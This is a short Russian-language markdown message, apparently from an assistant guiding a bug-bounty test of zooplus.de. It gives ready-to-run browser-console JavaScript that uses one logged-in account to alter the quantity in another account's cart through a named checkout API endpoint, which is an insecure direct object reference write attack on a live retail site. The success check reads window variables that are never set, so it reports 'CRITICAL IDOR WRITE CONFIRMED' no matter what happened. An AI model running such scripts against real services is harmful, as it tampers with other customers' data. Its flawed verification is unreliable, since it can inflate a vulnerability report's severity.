# ФИНАЛЬНЫЙ ТЕСТ: PUT метод найден!

## ✅ Найденный endpoint:

```
PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity
Status: 200
```

**Важно**: Метод **PUT**, а не POST!

## Выполните этот код в консоли браузера (Account B залогинен):

```javascript
const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  const beforeCount = cart.articles.length;
  const beforeTotal = cart.summary.grandTotal;
  const articleId = cart.articles[0]?.id;
  console.log(`Before: ${beforeCount} items, ${beforeTotal} EUR, Article ID: ${articleId}`);
  
  return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
    method: "PUT",  // ВАЖНО: PUT!
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({
      articleId: articleId,
      quantity: 2
    })
  });
})
.then(async r => {
  const text = await r.text();
  console.log(`Status: ${r.status}, Response: ${text.substring(0, 300)}`);
  
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  console.log(`After: ${cart.articles.length} items, ${cart.summary.grandTotal} EUR`);
  
  if (cart.articles.length !== window.beforeCount || Math.abs(cart.summary.grandTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log("[!!!] Account B successfully modified Account A's cart!");
  }
})
.catch(e => console.error("Error:", e));
```

## Если корзина изменилась:

1. Скриншот консоли с результатом
2. Скриншот корзины Account A после модификации
3. Обновлю отчет до **Critical (CVSS 9.1+)**

